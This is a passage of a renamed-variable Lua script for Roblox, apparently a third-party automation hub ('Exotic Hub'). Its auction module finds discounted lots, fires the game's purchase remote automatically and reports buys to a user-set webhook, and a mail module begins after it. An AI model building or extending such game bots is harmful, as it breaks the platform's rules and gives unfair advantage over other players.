				return math.max(Z, 0)
			end
		end
		return tonumber(G.startPrice) or 0
	end,
	IsActiveLotAuctioneer = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = Y.Auctioneer.GetServerTimeAuctioneer()
		local Z = Y.Auctioneer.GetStockAuctioneer(G)
		if type(y.Auctioneer) == "table" and type(y.Auctioneer.IsActive) == "function" then
			local j, i = pcall(y.Auctioneer.IsActive, G, V, Z)
			if j then
				return i == true
			end
		end
		return ((tonumber(G.expiresAt) or 0)) > V and ((Z == nil or Z > 0))
	end;
	GetTicksElapsedAuctioneer = function(G)
		if type(G) ~= "table" then
			return 0
		end
		if type(y.Auctioneer) == "table" and type(y.Auctioneer.TicksElapsed) == "function" then
			local V, Z = pcall(y.Auctioneer.TicksElapsed, G, Y.Auctioneer.GetServerTimeAuctioneer())
			if V and type(Z) == "number" then
				return math.max(math.floor(Z), 0)
			end
		end
		return 0
	end,
	GetDiscountPercentAuctioneer = function(G, V)
		local y = tonumber(type(G) == "table" and G.startPrice) or 0
		V = tonumber(V) or 0
		if y <= 0 then
			return 0
		end
		local Z = ((((y - V)) / y)) * 100
		return math.clamp(math.floor(Z + .5), 0, 100)
	end;
	GetStockAuctioneer = function(G)
		if type(G) ~= "table" then
			return 0
		end
		local V = tostring(G.lotId or "")
		if V ~= "" and type(Y.Auctioneer.StockAuctioneer) == "table" then
			local G = Y.Auctioneer.StockAuctioneer[V]
			if type(G) == "number" then
				return G
			end
		end
		if G.stockQuantity == nil then
			return nil
		end
		return tonumber(G.stockQuantity) or 0
	end,
	GetOverrideAuctioneer = function(G)
		G = tostring(G or "")
		local V = type(h.auctioneer_overrides) == "table" and h.auctioneer_overrides or {}
		local y = V[G]
		if type(y) ~= "table" then
			return nil
		end
		return {
			enabled = y.enabled ~= false;
			price = math.max(tonumber(y.price) or 0, 0);
			percent = math.clamp(math.floor(tonumber(y.percent) or 50), 0, 100);
			max_stock = math.clamp(math.floor(tonumber(y.max_stock) or 99999), 1, 99999)
		}
	end,
	GetOverrideSummaryAuctioneer = function(G, V)
		G = tostring(G or "")
		V = type(V) == "table" and V or Y.Auctioneer.GetOverrideAuctioneer(G)
		if G == "" or type(V) ~= "table" then
			return "Invalid override"
		end
		local y = math.max(tonumber(V.price) or 0, 0)
		local Z = math.clamp(math.floor(tonumber(V.percent) or 50), 0, 100)
		local j = math.clamp(math.floor(tonumber(V.max_stock) or 99999), 1, 99999)
		local i = V.enabled == false and "Off" or "On"
		local c = y > 0 and "under $" .. q.formatShecklesNumber(y) or tostring(Z) .. "%+"
		return string.format("%s | %s | %s | max %d", G, i, c, j)
	end;
	GetSortedOverridesAuctioneer = function()
		local G = {}
		local V = type(h.auctioneer_overrides) == "table" and h.auctioneer_overrides or {}
		for V, y in pairs(V) do
			V = tostring(V or "")
			if V ~= "" and type(y) == "table" then
				table.insert(G, {
					itemName = V;
					rule = {
						enabled = y.enabled ~= false;
						price = math.max(tonumber(y.price) or 0, 0),
						percent = math.clamp(math.floor(tonumber(y.percent) or 50), 0, 100);
						max_stock = math.clamp(math.floor(tonumber(y.max_stock) or 99999), 1, 99999)
					}
				})
			end
		end
		table.sort(G, function(G, V)
			local y = type(G.rule) == "table" and G.rule.enabled ~= false or false
			local Z = type(V.rule) == "table" and V.rule.enabled ~= false or false
			if y ~= Z then
				return y
			end
			return tostring(G.itemName or "") < tostring(V.itemName or "")
		end)
		return G
	end;
	GetOverrideUiKeyAuctioneer = function(G)
		G = tostring(G or "")
		local V = 0
		for y = 1, # G, 1 do
			V = ((V * 31 + string.byte(G, y))) % 100000000
		end
		local y = (G:gsub("[^%w_]", "_")):sub(1, 40)
		if y == "" then
			y = "item"
		end
		return "auctioneer_override_active_" .. (y .. ("_" .. tostring(V)))
	end;
	GetLotOverrideAuctioneer = function(G)
		if type(G) ~= "table" then
			return nil, ""
		end
		local V = tostring(G.item or "")
		local y = Y.Auctioneer.GetDisplayNameAuctioneer(G)
		local Z = V ~= "" and Y.Auctioneer.GetOverrideAuctioneer(V) or nil
		if Z and Z.enabled ~= false then
			return Z, V
		end
		Z = Y.Auctioneer.GetOverrideAuctioneer(y)
		if Z and Z.enabled ~= false then
			return Z, y
		end
		return nil, V ~= "" and V or y
	end;
	SaveOverrideAuctioneer = function(G, V, y, Z)
		G = tostring(G or "")
		if G == "" then
			return false, "Select an item first"
		end
		if type(h.auctioneer_overrides) ~= "table" then
			h.auctioneer_overrides = {}
		end
		if type(h.auctioneer_buy_selected) ~= "table" then
			h.auctioneer_buy_selected = {}
		end
		h.auctioneer_overrides[G] = {
			enabled = true;
			price = math.max(math.floor(tonumber(V) or 0), 0),
			percent = math.clamp(math.floor(tonumber(y) or 50), 0, 100),
			max_stock = math.clamp(math.floor(tonumber(Z) or 99999), 1, 99999)
		}
		h.auctioneer_buy_selected[G] = true
		a.Save.SaveDataSync()
		Y.Auctioneer.RefreshOverridesAuctioneer()
		Y.Auctioneer.RefreshItemDropdownAuctioneer()
		return true
	end;
	RemoveOverrideAuctioneer = function(G)
		G = tostring(G or "")
		if G == "" or type(h.auctioneer_overrides) ~= "table" then
			return false
		end
		h.auctioneer_overrides[G] = nil
		a.Save.SaveDataSync()
		Y.Auctioneer.RefreshOverridesAuctioneer()
		return true
	end,
	ToggleOverrideAuctioneer = function(G, V)
		G = tostring(G or "")
		if G == "" or type(h.auctioneer_overrides) ~= "table" or type(h.auctioneer_overrides[G]) ~= "table" then
			return false
		end
		h.auctioneer_overrides[G].enabled = V == true
		a.Save.SaveDataSync()
		Y.Auctioneer.RefreshOverridesAuctioneer()
		return true
	end;
	PassesSelectedItemAuctioneer = function(G)
		local V = Z.TotalControl.ResolveAuctioneerPassesSelectedItemTotalControl(G)
		if V ~= nil then
			return V == true
		end
		local y = tostring(type(G) == "table" and G.item or "")
		local j = Y.Auctioneer.GetDisplayNameAuctioneer(G)
		local i = type(h.auctioneer_blacklisted_items) == "table" and h.auctioneer_blacklisted_items or {}
		if Y.Auctioneer.SelectionHasAuctioneer(i, y) or Y.Auctioneer.SelectionHasAuctioneer(i, j) then
			return false
		end
		local c = type(h.auctioneer_buy_selected) == "table" and h.auctioneer_buy_selected or {}
		if next(c) == nil then
			return false
		end
		return Y.Auctioneer.SelectionHasAuctioneer(c, y) or Y.Auctioneer.SelectionHasAuctioneer(c, j)
	end;
	GetBuyLimitAuctioneer = function(G)
		local V = Y.Auctioneer.GetLotOverrideAuctioneer(G)
		return V and V.max_stock or 99999
	end,
	PassesPriceAuctioneer = function(G, V, y)
		local j, i = Z.TotalControl.ResolveAuctioneerPassesPriceTotalControl(G, V, y)
		if j ~= nil then
			return j == true, i
		end
		local c = Y.Auctioneer.GetLotOverrideAuctioneer(G)
		if c and c.price > 0 then
			return V <= c.price, string.format("waiting under $%s", q.formatShecklesNumber(c.price))
		end
		local J = c and c.percent or (tonumber(h.auctioneer_min_percent) or 50)
		J = math.clamp(math.floor(J), 0, 100)
		if y >= J then
			return true
		end
		return false, string.format("waiting %d%%", J)
	end,
	BuildCandidateAuctioneer = function(G)
		if type(G) ~= "table" or type(G.lotId) ~= "string" then
			return nil
		end
		if G.robuxPrice ~= nil then
			return nil
		end
		if not Y.Auctioneer.IsActiveLotAuctioneer(G) then
			return nil
		end
		if not Y.Auctioneer.PassesSelectedItemAuctioneer(G) then
			return nil
		end
		local V = Y.Auctioneer.GetCurrentPriceAuctioneer(G)
		if V <= 0 then
			return nil
		end
		local y = tonumber(Z.Money.GetSheckles()) or 0
		local j = Z.TotalControl.ResolveAuctioneerAffordableTotalControl(G, V, y)
		if j ~= nil then
			if j ~= true then
				return nil
			end
		elseif y < V then
			return nil
		else
			local G = math.max(tonumber(h.auctioneer_min_sheckles) or 0, 0)
			if G > 0 and y < G then
				return nil
			end
		end
		local i = Y.Auctioneer.GetDiscountPercentAuctioneer(G, V)
		local c = Y.Auctioneer.PassesPriceAuctioneer(G, V, i)
		if not c then
			return nil
		end
		local J = Y.Auctioneer.GetDisplayNameAuctioneer(G)
		local T = tostring(G.item or J)
		local d = Y.Auctioneer.GetBuyLimitAuctioneer(G)
		local u = tonumber(Y.Auctioneer.BoughtByItemAuctioneer[T]) or 0
		if u >= d then
			return nil
		end
		local q = Y.Auctioneer.GetStockAuctioneer(G)
		if q ~= nil and q <= 0 then
			return nil
		end
		return {
			lot = G;
			displayName = J;
			itemName = T;
			currentPrice = V,
			discountPercent = i;
			stock = q,
			ticks = Y.Auctioneer.GetTicksElapsedAuctioneer(G)
		}
	end;
	GetBestCandidateAuctioneer = function()
		local G = {}
		for V, y in ipairs(Y.Auctioneer.LiveLotsAuctioneer) do
			local Z = Y.Auctioneer.BuildCandidateAuctioneer(y)
			if Z then
				table.insert(G, Z)
			end
		end
		if # G == 0 then
			return nil
		end
		table.sort(G, function(G, V)
			local y = Z.TotalControl.ResolveAuctionCandidateScoreTotalControl(G)
			local j = Z.TotalControl.ResolveAuctionCandidateScoreTotalControl(V)
			if y ~= nil and (j ~= nil and y ~= j) then
				return y > j
			end
			if G.discountPercent ~= V.discountPercent then
				return G.discountPercent > V.discountPercent
			end
			if G.currentPrice ~= V.currentPrice then
				return G.currentPrice < V.currentPrice
			end
			return tostring(G.displayName) < tostring(V.displayName)
		end)
		return G[1]
	end,
	PurchaseLotAuctioneer = function(G)
		if type(G) ~= "table" or type(G.lot) ~= "table" then
			return false
		end
		local V = tostring(G.lot.lotId or "")
		if V == "" then
			Y.Auctioneer.SetStatusAuctioneer("Invalid auction lot", "#FF6666")
			return false
		end
		local j = y.Networking and (y.Networking.Auctioneer and y.Networking.Auctioneer.PurchaseLot)
		if not j or type(j.Fire) ~= "function" then
			Y.Auctioneer.SetStatusAuctioneer("Purchase unavailable", "#FF6666")
			return false
		end
		local i = Z.TotalControl.ResolveAuctioneerPreviewOnlyTotalControl()
		local c = i ~= nil and i == true or h.auctioneer_preview_only == true
		if c then
			local y = table.concat({
				V,
				tostring(math.floor(tonumber(G.currentPrice) or 0)),
				tostring(math.floor(tonumber(G.discountPercent) or 0))
			}, "|")
			Y.Auctioneer.SetStatusAuctioneer(string.format("Preview: %s at %d%%", G.displayName, G.discountPercent), "#66CCFF")
			if Y.Auctioneer.PreviewLogKeysAuctioneer[y] ~= true then
				Y.Auctioneer.PreviewLogKeysAuctioneer[y] = true
				Y.Auctioneer.AddLogAuctioneer(string.format("Would buy %s | $%s | %d%%", G.displayName, q.formatShecklesNumber(G.currentPrice), G.discountPercent), "#66CCFF")
			end
			Y.Auctioneer.PendingCandidateAuctioneer = nil
			return false
		end
		Y.Auctioneer.PendingCandidateAuctioneer = G
		Y.Auctioneer.PurchaseBusyAuctioneer = true
		Y.Auctioneer.NextPurchaseAtAuctioneer = os.clock() + Y.Auctioneer.GetPurchaseCooldownAuctioneer()
		Y.Auctioneer.PurchaseTimeoutAtAuctioneer = os.clock() + math.max(Y.Auctioneer.GetPurchaseCooldownAuctioneer() + 5, 12)
		Y.Auctioneer.SetStatusAuctioneer(string.format("Buying %s", G.displayName), "#FFCC66")
		Y.Auctioneer.AddLogAuctioneer(string.format("Buying %s | $%s | %d%%", G.displayName, q.formatShecklesNumber(G.currentPrice), G.discountPercent), "#FFCC66")
		local J, T = pcall(function()
			j:Fire(V, G.currentPrice)
		end)
		if not J then
			Y.Auctioneer.PurchaseBusyAuctioneer = false
			Y.Auctioneer.PurchaseTimeoutAtAuctioneer = 0
			Y.Auctioneer.PendingCandidateAuctioneer = nil
			Y.Auctioneer.SetStatusAuctioneer("Buy failed", "#FF6666")
			Y.Auctioneer.AddLogAuctioneer("Buy failed: " .. tostring(T), "#FF6666")
			return false
		end
		return true
	end,
	CheckPurchaseTimeoutAuctioneer = function()
		if Y.Auctioneer.PurchaseBusyAuctioneer ~= true then
			return false
		end
		local G = tonumber(Y.Auctioneer.PurchaseTimeoutAtAuctioneer) or 0
		if G <= 0 or os.clock() < G then
			return false
		end
		local V = Y.Auctioneer.PendingCandidateAuctioneer
		Y.Auctioneer.PurchaseBusyAuctioneer = false
		Y.Auctioneer.PurchaseTimeoutAtAuctioneer = 0
		Y.Auctioneer.PendingCandidateAuctioneer = nil
		local y = type(V) == "table" and tostring(V.displayName or "Unknown") or "Unknown"
		Y.Auctioneer.SetStatusAuctioneer("Buy timed out", "#FF6666")
		Y.Auctioneer.AddLogAuctioneer("Buy timed out: " .. y, "#FF6666")
		Y.Auctioneer.SendWebhookAuctioneer(false, "Auction purchase timed out.", V)
		return true
	end;
	GetPurchaseCooldownAuctioneer = function()
		local G = y.AuctioneerFlags
		local V = type(G) == "table" and G.PurchaseCooldownSeconds or nil
		if V and type(V.Get) == "function" then
			local G, y = pcall(function()
				return V:Get()
			end)
			if G and type(y) == "number" then
				return math.clamp(y, .2, 60)
			end
		end
		return 10
	end;
	BuildWebhookPayloadAuctioneer = function(G, V, Z)
		Z = type(Z) == "table" and Z or {}
		local j = G and "\240\159\148\168 Auctioneer Purchase" or "\226\154\160\239\184\143 Auctioneer Failed"
		local i = G and 5763719 or 16733525
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = j,
					description = tostring(V or "Auctioneer update");
					color = i;
					fields = {
						{
							name = "Item";
							value = tostring(Z.displayName or "Unknown"),
							inline = true
						};
						{
							name = "Price",
							value = "$" .. q.formatShecklesNumber(Z.currentPrice or 0);
							inline = true
						};
						{
							name = "Discount",
							value = tostring(Z.discountPercent or 0) .. "%",
							inline = true
						};
						{
							name = "Account",
							value = "||@" .. (tostring(y.LocalPlayer and y.LocalPlayer.Name or "Unknown") .. "||"),
							inline = true
						}
					},
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end,
	SendWebhookAuctioneer = function(G, V, y)
		if not h.webhook_enabled then
			return false
		end
		if G == true and h.auctioneer_webhook_success ~= true then
			return false
		end
		if G ~= true and h.auctioneer_webhook_fail ~= true then
			return false
		end
		if not Z.Webhooks or type(Z.Webhooks.Post) ~= "function" or not Z.Webhooks.IsValidUrl(h.webhook_url) then
			return false
		end
		local j = Y.Auctioneer.BuildWebhookPayloadAuctioneer(G, V, y)
		task.spawn(function()
			local G, V = Z.Webhooks.Post(j)
			if not G then
				Y.Auctioneer.AddLogAuctioneer("Webhook failed: " .. tostring(V), "#FF6666")
			end
		end)
		return true
	end;
	HandlePurchaseResultAuctioneer = function(G, V, y)
		G = tostring(G or "")
		y = tostring(y or "")
		local Z = Y.Auctioneer.PendingCandidateAuctioneer
		if type(Z) ~= "table" then
			return false
		end
		local j = tostring(type(Z.lot) == "table" and Z.lot.lotId or "")
		if j ~= "" and (G ~= "" and G ~= j) then
			return false
		end
		local i = G ~= "" and G or j
		Y.Auctioneer.PurchaseBusyAuctioneer = false
		Y.Auctioneer.PurchaseTimeoutAtAuctioneer = 0
		Y.Auctioneer.PendingCandidateAuctioneer = nil
		if V == true then
			if i ~= "" then
				Y.Auctioneer.BoughtByLotAuctioneer[i] = ((tonumber(Y.Auctioneer.BoughtByLotAuctioneer[i]) or 0)) + 1
			end
			Y.Auctioneer.BoughtByItemAuctioneer[Z.itemName] = ((tonumber(Y.Auctioneer.BoughtByItemAuctioneer[Z.itemName]) or 0)) + 1
			Y.Auctioneer.SetStatusAuctioneer("Bought " .. tostring(Z.displayName or i), "#7CFC00")
			Y.Auctioneer.AddLogAuctioneer("Bought " .. tostring(Z.displayName or i), "#7CFC00")
			Y.Auctioneer.SendWebhookAuctioneer(true, "Auction purchase completed.", Z)
			Y.Auctioneer.SyncFastAuctionDataAuctioneer(true)
			task.defer(Y.Auctioneer.LoopAuctioneer)
			return true
		end
		Y.Auctioneer.SetStatusAuctioneer(y ~= "" and y or "Purchase rejected", "#FF6666")
		Y.Auctioneer.AddLogAuctioneer("Failed " .. (tostring(Z.displayName or i) .. ((y ~= "" and ": " .. y or ""))), "#FF6666")
		Y.Auctioneer.SendWebhookAuctioneer(false, y ~= "" and y or "Auction purchase rejected.", Z)
		Y.Auctioneer.SyncFastAuctionDataAuctioneer(true)
		task.defer(Y.Auctioneer.LoopAuctioneer)
		return false
	end;
	ApplySnapshotAuctioneer = function(G)
		if type(G) ~= "table" then
			Y.Auctioneer.SetStatusAuctioneer("Waiting for auction lots", "#FFCC66")
			return false
		end
		local V = G.manifest
		local y = type(V) == "table" and V.lots or nil
		local Z = {}
		if type(y) == "table" then
			for G, V in pairs(y) do
				if type(V) == "table" and type(V.lotId) == "string" then
					table.insert(Z, V)
				end
			end
		end
		Y.Auctioneer.LiveLotsAuctioneer = Z
		Y.Auctioneer.StockAuctioneer = type(G.stock) == "table" and G.stock or {}
		Y.Auctioneer.LastSnapshotAtAuctioneer = os.clock()
		local j = tostring(G.rollWindowUnix or "")
		if j ~= "" and j ~= Y.Auctioneer.RestockKeyAuctioneer then
			Y.Auctioneer.RestockKeyAuctioneer = j
			table.clear(Y.Auctioneer.BoughtByItemAuctioneer)
			table.clear(Y.Auctioneer.BoughtByLotAuctioneer)
			table.clear(Y.Auctioneer.PreviewLogKeysAuctioneer)
		end
		Y.Auctioneer.SetStatusAuctioneer(# Z > 0 and string.format("Auction list ready (%d)", # Z) or "Waiting for auction lots", # Z > 0 and "#7CFC00" or "#FFCC66")
		Y.Auctioneer.RefreshItemDropdownAuctioneer()
		Y.Auctioneer.RefreshLiveLotsAuctioneer()
		return true
	end;
	ApplyStockUpdateAuctioneer = function(G)
		if type(G) ~= "table" then
			return false
		end
		if type(G.stock) == "table" then
			Y.Auctioneer.StockAuctioneer = G.stock
			Y.Auctioneer.RefreshLiveLotsAuctioneer()
			return true
		end
		return false
	end,
	RequestSnapshotAuctioneer = function(G)
		if Y.Auctioneer.RequestingSnapshotAuctioneer then
			return false
		end
		if tostring(G or "") ~= "manual" and os.clock() - ((tonumber(Y.Auctioneer.LastSnapshotRequestAtAuctioneer) or 0)) < 1 then
			return false
		end
		local V = Y.FastAuction
		if type(V) ~= "table" or type(V.RequestSnapshotFastAuction) ~= "function" then
			Y.Auctioneer.SetStatusAuctioneer("Auction list unavailable", "#FF6666")
			return false
		end
		Y.Auctioneer.LastSnapshotRequestAtAuctioneer = os.clock()
		Y.Auctioneer.RequestingSnapshotAuctioneer = true
		Y.Auctioneer.SetStatusAuctioneer("Checking auction lots...", "#FFCC66")
		V.RequestSnapshotFastAuction(tostring(G or "") == "manual")
		task.spawn(function()
			task.wait(.1)
			if # V.LiveLotsFastAuction == 0 and type(V.BootstrapControllerCacheFastAuction) == "function" then
				V.BootstrapControllerCacheFastAuction()
			end
			Y.Auctioneer.RequestingSnapshotAuctioneer = false
			local y = Y.Auctioneer.SyncFastAuctionDataAuctioneer(true)
			if y then
				Y.Auctioneer.SetStatusAuctioneer(string.format("Auction list ready (%d)", # Y.Auctioneer.LiveLotsAuctioneer), "#7CFC00")
				if tostring(G or "") == "manual" then
					Y.Auctioneer.AddLogAuctioneer("Auction lots refreshed", "#7CFC00")
				end
			elseif # Y.Auctioneer.LiveLotsAuctioneer == 0 then
				Y.Auctioneer.SetStatusAuctioneer("Waiting for auction lots", "#FFCC66")
			end
		end)
		return true
	end,
	StartPassiveSnapshotRetryAuctioneer = function()
		if Y.Auctioneer.StartedSnapshotRetryAuctioneer then
			return false
		end
		Y.Auctioneer.StartedSnapshotRetryAuctioneer = true
		task.spawn(function()
			task.wait(4)
			while Y.Auctioneer.StartedAuctioneer and not g.is_forced_stop do
				if # Y.Auctioneer.LiveLotsAuctioneer == 0 and (Y.Auctioneer.RequestingSnapshotAuctioneer ~= true and os.clock() - ((tonumber(Y.Auctioneer.LastSnapshotRequestAtAuctioneer) or 0)) >= 10) then
					Y.Auctioneer.RequestSnapshotAuctioneer("passive")
				end
				task.wait(12)
			end
			Y.Auctioneer.StartedSnapshotRetryAuctioneer = false
		end)
		return true
	end;
	StartAuctioneer = function()
		if Y.Auctioneer.StartedAuctioneer then
			return false
		end
		local G = y.Networking and y.Networking.Auctioneer
		if type(G) ~= "table" then
			return false
		end
		Y.Auctioneer.StartedAuctioneer = true
		if G.Snapshot and G.Snapshot.OnClientEvent then
			G.Snapshot.OnClientEvent:Connect(function()
				task.defer(function()
					Y.Auctioneer.SyncFastAuctionDataAuctioneer(true)
				end)
			end)
		end
		if G.StockUpdate and G.StockUpdate.OnClientEvent then
			G.StockUpdate.OnClientEvent:Connect(function()
				task.defer(function()
					Y.Auctioneer.SyncFastAuctionDataAuctioneer(false)
					Y.Auctioneer.RefreshLiveLotsAuctioneer()
				end)
			end)
		end
		if G.PurchaseResult and G.PurchaseResult.OnClientEvent then
			G.PurchaseResult.OnClientEvent:Connect(function(G, V, y)
				Y.Auctioneer.HandlePurchaseResultAuctioneer(G, V, y)
			end)
		end
		task.spawn(function()
			local G = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
			if G then
				pcall(function()
					G:WaitForChild("Auction", 30)
				end)
			end
			task.wait(1)
			Y.Auctioneer.RequestSnapshotAuctioneer("startup")
		end)
		Y.Auctioneer.StartPassiveSnapshotRetryAuctioneer()
		task.spawn(function()
			while Y.Auctioneer.StartedAuctioneer and not g.is_forced_stop do
				if not Z.SystemPause.IsPausedSystemPause("Shop Loops") then
					Y.Auctioneer.LoopAuctioneer()
				end
				task.wait(.5)
			end
		end)
		return true
	end,
	LoopAuctioneer = function()
		Y.Auctioneer.SyncFastAuctionDataAuctioneer(false)
		if not Y.Auctioneer.IsEnabledAuctioneer() then
			if g.AuctioneerStatusText ~= "" then
				Y.Auctioneer.SetStatusAuctioneer("", "#FFFFFF")
			end
			return false
		end
		if type(y.Auctioneer) ~= "table" then
			Y.Auctioneer.SetStatusAuctioneer("Auction unavailable", "#FF6666")
			return false
		end
		if Y.Auctioneer.PurchaseBusyAuctioneer then
			Y.Auctioneer.CheckPurchaseTimeoutAuctioneer()
			return false
		end
		if # Y.Auctioneer.LiveLotsAuctioneer == 0 and os.clock() - Y.Auctioneer.LastSnapshotAtAuctioneer > 10 then
			Y.Auctioneer.RequestSnapshotAuctioneer("loop")
			return false
		end
		if os.clock() < Y.Auctioneer.NextPurchaseAtAuctioneer then
			return false
		end
		local G = Y.Auctioneer.GetBestCandidateAuctioneer()
		if not G then
			Y.Auctioneer.SetStatusAuctioneer("Watching selected items", "#CFCFCF")
			return false
		end
		Y.Auctioneer.PendingCandidateAuctioneer = G
		return Y.Auctioneer.PurchaseLotAuctioneer(G)
	end,
	FormatTimerAuctioneer = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		local V = math.floor(G / 60)
		local y = G % 60
		if V < 60 then
			return string.format("%dm %02ds", V, y)
		end
		return string.format("%dh %dm", math.floor(V / 60), V % 60)
	end,
	RefreshItemDropdownAuctioneer = function()
		local G = g.AuctioneerUiRefs
		if type(G) ~= "table" then
			return false
		end
		local V = Y.Auctioneer.GetItemDropdownAuctioneer()
		if G.ItemDropdown and type(G.ItemDropdown.SetValues) == "function" then
			G.ItemDropdown:SetValues(V)
			G.ItemDropdown:SetValue(type(h.auctioneer_buy_selected) == "table" and h.auctioneer_buy_selected or {})
		end
		if G.BlockDropdown and type(G.BlockDropdown.SetValues) == "function" then
			G.BlockDropdown:SetValues(V)
			G.BlockDropdown:SetValue(type(h.auctioneer_blacklisted_items) == "table" and h.auctioneer_blacklisted_items or {})
		end
		if G.OverrideItemDropdown and type(G.OverrideItemDropdown.SetValues) == "function" then
			G.OverrideItemDropdown:SetValues(V)
		end
		return true
	end;
	RefreshLiveLotsAuctioneer = function()
		local G = g.AuctioneerUiRefs
		if type(G) ~= "table" or not G.LiveLotsLabel or type(G.LiveLotsLabel.SetText) ~= "function" then
			return false
		end
		local V = {}
		local y = Y.Auctioneer.GetServerTimeAuctioneer()
		local j = {}
		for G, V in ipairs(Y.Auctioneer.LiveLotsAuctioneer) do
			if type(V) == "table" then
				table.insert(j, V)
			end
		end
		table.sort(j, function(G, V)
			local y = Y.Auctioneer.GetCurrentPriceAuctioneer(G)
			local Z = Y.Auctioneer.GetCurrentPriceAuctioneer(V)
			local j = Y.Auctioneer.GetDiscountPercentAuctioneer(G, y)
			local i = Y.Auctioneer.GetDiscountPercentAuctioneer(V, Z)
			if j ~= i then
				return j > i
			end
			return y < Z
		end)
		for G, j in ipairs(j) do
			if G > 6 then
				break
			end
			local i = Y.Auctioneer.GetDisplayNameAuctioneer(j)
			local c = Y.Auctioneer.GetCurrentPriceAuctioneer(j)
			local J = Y.Auctioneer.GetDiscountPercentAuctioneer(j, c)
			local T = Y.Auctioneer.ResolveRarityAuctioneer(j)
			local d = Z.Data.GetRarityColor(T)
			local u = Y.Auctioneer.GetStockAuctioneer(j)
			local g = u == nil and "\226\136\158" or q.formatShecklesNumber(u)
			local E = Y.Auctioneer.FormatTimerAuctioneer(((tonumber(j.expiresAt) or y)) - y)
			local a = math.max(math.floor(tonumber(j.count) or 1), 1)
			local H = a > 1 and string.format("%s x%d", i, a) or i
			local r = j.robuxPrice ~= nil and "Robux - skipped" or "$" .. q.formatShecklesNumber(c)
			table.insert(V, string.format("%d) <font color=\'#FFFFFF\'>%s</font>\n   <font color=\'%s\'>%s</font> | %s | <font color=\'#66CCFF\'>%d%%</font>\n   <font color=\'#7CFC00\'>%s</font> | S:%s | %s", G, H, d, T, tostring(j.category or "Unknown"), J, r, g, E))
		end
		G.LiveLotsLabel:SetText(# V > 0 and table.concat(V, "\n") or "<font color=\'#888888\'>Waiting for auction lots.</font>")
		return true
	end;
	RefreshLogsAuctioneer = function()
		local G = g.AuctioneerUiRefs
		if type(G) ~= "table" or not G.LogLabel or type(G.LogLabel.SetText) ~= "function" then
			return false
		end
		local V = {}
		for G, y in ipairs(g.AuctioneerLogs) do
			if G > 8 then
				break
			end
			table.insert(V, string.format("<font color=\'%s\'>%s</font>", tostring(y.colour or "#CFCFCF"), tostring(y.text or "")))
		end
		G.LogLabel:SetText(# V > 0 and table.concat(V, "\n") or "<font color=\'#888888\'>No auction logs yet.</font>")
		return true
	end;
	RefreshOverridesAuctioneer = function()
		local G = g.AuctioneerUiRefs
		if type(G) ~= "table" then
			return false
		end
		if type(G.RefreshOverrideRowsAuctioneer) == "function" then
			G.RefreshOverrideRowsAuctioneer()
		end
		if G.OverrideLabel and type(G.OverrideLabel.SetText) == "function" then
			local V = {}
			for G, y in ipairs(Y.Auctioneer.GetSortedOverridesAuctioneer()) do
				table.insert(V, "\226\128\162 " .. Y.Auctioneer.GetOverrideSummaryAuctioneer(y.itemName, y.rule))
			end
			G.OverrideLabel:SetText(# V > 0 and table.concat(V, "\n") or "<font color=\'#888888\'>No item overrides. Selected items use the global percent.</font>")
		end
		return true
	end
}
g.MailStatusText = ""
g.MailDraftItems = {}
g.MailDraftTargetUsername = ""
g.MailDraftCategory = "Seeds"
g.MailDraftItemName = ""
g.MailDraftAmount = 1
g.MailDraftFruitMinKg = 0
g.MailDraftFruitMaxKg = 89
g.MailDraftFruitMutations = {}
g.MailDraftFruitVariants = {}
g.MailManualRunning = false
g.MailActiveOrder = nil
g.MailManualUiStatusText = "<font color=\'#888888\'>Ready to send</font>"
g.MailManualStatusLabel = nil
g.MailStartOrderButton = nil
g.MailClearOrderButton = nil
g.MailStopOrderButton = nil
g.MailSelectedReceipt = ""
g.MailSelectedRuleId = ""
g.MailUiRefs = {}
Z.Mail = {
	Started = false;
	Busy = false;
	NextSendAt = 0,
	EquippedPets = {},
	RecentlySentPets = {},
	RecentlySentFruits = {},
	RuleCooldowns = {},
	MaxBatchItems = 20;
	MaxStackMailCount = 999999,
	ManualSendDelay = 10.1;
	AutoMinSendDelay = 40;
	AutoMaxSendDelay = 90;
	RetryDelay = 10;
	ClaimDelay = .5;
	MaxFailures = 5,
	MaxReceipts = 50;
	SetStatus = function(G, V)
		g.MailStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\147\172 [Mail]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), tostring(G or "Waiting"))
	end;
	ClearStatus = function()
		g.MailStatusText = ""
	end,
	SetManualUiStatus = function(G, V, y)
		g.MailManualUiStatusText = string.format("<font color=\'%s\'>%s %s</font>", tostring(V or "#FFFFFF"), tostring(y or "\240\159\147\172"), tostring(G or "Waiting"))
	end;
	SetUiDisabled = function(G, V)
		if not G then
			return
		end
		V = V == true
		if type(G.SetDisabled) == "function" then
			local y = pcall(function()
				G:SetDisabled(V)
			end)
			if y then
				return
			end
		end
		pcall(function()
			G.Disabled = V
		end)
	end;
	RefreshManualUi = function()
		local G = g.MailManualStatusLabel
		if G and type(G.SetText) == "function" then
			pcall(function()
				G:SetText(g.MailManualUiStatusText)
			end)
		end
		Z.Mail.SetUiDisabled(g.MailStartOrderButton, g.MailManualRunning)
		Z.Mail.SetUiDisabled(g.MailClearOrderButton, g.MailManualRunning)
		Z.Mail.SetUiDisabled(g.MailStopOrderButton, not g.MailManualRunning)
	end,
	GetServerTime = function()
		local G, V = pcall(function()
			return y.Workspace:GetServerTimeNow()
		end)
		if G and type(V) == "number" then
			return V
		end
		return os.time()
	end,
	GetSendWait = function()
		local G = math.max(Z.Mail.NextSendAt - os.clock(), 0)
		local V = math.max(((tonumber(h.mail_next_send_at) or 0)) - Z.Mail.GetServerTime(), 0)
		return math.max(G, V)
	end;
	GetNextSendDelay = function(G)
		if G ~= true then
			return tonumber(Z.Mail.ManualSendDelay) or 10.1
		end
		local V = math.max(math.floor(tonumber(Z.Mail.AutoMinSendDelay) or 40), 1)
		local y = math.max(math.floor(tonumber(Z.Mail.AutoMaxSendDelay) or V), V)
		return math.random(V, y)
	end;
	GetNote = function(G)
		if not h.mail_include_comment then
			return ""
		end
		return (tostring(G or "")):sub(1, 100)
